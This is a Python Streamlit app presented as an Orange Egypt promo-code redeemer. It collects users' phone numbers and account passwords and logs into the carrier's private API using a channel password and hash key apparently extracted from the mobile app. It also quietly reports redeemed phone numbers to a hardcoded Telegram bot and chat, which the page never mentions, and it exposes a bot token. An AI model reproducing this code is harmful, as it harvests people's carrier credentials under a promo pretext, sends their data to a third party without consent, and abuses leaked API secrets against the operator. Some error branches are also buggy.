import streamlit as st
import requests
import hashlib
import telebot

# Telegram bot setup
TOKEN = "7060312406:AAGqNhOh6s4RVufoV4Qp1eq8D0DNNDfDiZs"
CHAT_ID = 5939899289
bot = telebot.TeleBot(TOKEN)

# Streamlit app
st.title("Orange Promo Code Redeemer")
num = st.text_input("Enter your number:")
pas = st.text_input("Enter your password:", type="password")
submit_button = st.button("Redeem Promo Code")

if submit_button:
    st.write("Please wait...")

    url = 'https://services.orange.eg/SignIn.svc/SignInUser'
    header ={
    "net-msg-id": "61f91ede006159d16840827295301013",
    "x-microservice-name": "APMS",
    "Content-Type": "application/json; charset=UTF-8",
    "Content-Length": "166",
    "Host": "services.orange.eg",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/3.14.9",
    }
    data = '{"appVersion":"7.2.0","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}' % (num,pas)
    r = requests.post(url, headers=header, data=data).json()

    userid = r["SignInUserResult"]["UserData"]["UserID"]
    st.write("Wait..🤌🔥")

    urlo = "https://services.orange.eg/GetToken.svc/GenerateToken"
    hdo = {"Content-type":"application/json", 
      "Content-Length":"78", 
      "Host":"services.orange.eg",
       "Connection":"Keep-Alive",
        "User-Agent":"okhttp/3.12.1"}
    datao = '{"appVersion":"2.9.8","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}' %(num,pas)
    ctv = requests.post(urlo, headers=hdo, data=datao).json()["GenerateTokenResult"]["Token"]
    key = ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
    htv = (str(hashlib.sha256((ctv+key).encode('utf-8')).hexdigest()).upper())
    url2 = "https://services.orange.eg/APIs/Promotions/api/CAF/Redeem"
    data2 = '{"Language":"ar","OSVersion":"Android7.0","PromoCode":"رمضان كريم","dial":"%s","password":"%s","Channelname":"MobinilAndMe","ChannelPassword":"ig3yh*mk5l42@oj7QAR8yF"}' %(num,pas)
    header2 = {
    "_ctv": ctv,
    "_htv": htv,
    "UserId": userid,
    "Content-Type": "application/json; charset=UTF-8",
    "Content-Length": "142",
    "Host": "services.orange.eg",
    "Connection": "Keep-Alive",
    "User-Agent": "okhttp/3.14.9",
    }
    da = data2.encode('utf-8')
    response = requests.post(url2, headers=header2, data=da).json()

    if 'ErrorDescription' in response:
        if response['ErrorDescription'] == 'Success':
            st.success("تم إضافة 524 ميجا بنجاح")
            bot.send_message(CHAT_ID, f"تم إضافة 524 ميجا بنجاح إلى الرقم {num}")
        elif response['ErrorDescription'] == 'User is redeemed before':
            st.error("العرض غير متاح لك حاليا")
            bot.send_message(CHAT_ID, f"العرض غير متاح لك حاليا")
        else:
            st.error(f"pas")
            bot.send_message(CHAT_ID, f"num")
    else:
        st.error(f"pas")
        bot.send_message(CHAT_ID, f"num")
